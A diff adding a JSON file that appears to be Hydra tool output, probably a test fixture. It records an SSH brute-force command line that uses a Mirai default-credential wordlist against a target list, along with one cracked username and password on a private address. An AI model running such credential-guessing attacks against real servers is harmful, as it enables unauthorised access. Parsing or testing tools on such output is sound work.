@@ -1,0 +1,11 @@
+{ "generator": {
+	"software": "Hydra", "version": "v9.0", "built": "2020-04-13 19:34:12",
+	"server": "targets.txt", "service": "ssh", "jsonoutputversion": "1.00",
+	"commandline": "hydra -C ../wordlists/mirai_user_pass.txt -I -t 4 -M targets.txt -b json -o hydra_output.json ssh"
+	},
+"results": [
+	{"port": 22, "service": "ssh", "host": "192.168.0.242", "login": "loneferret", "password": "starwars"}
+	],
+"success": true,
+"errormessages": [  ],
+"quantityfound": 1   }
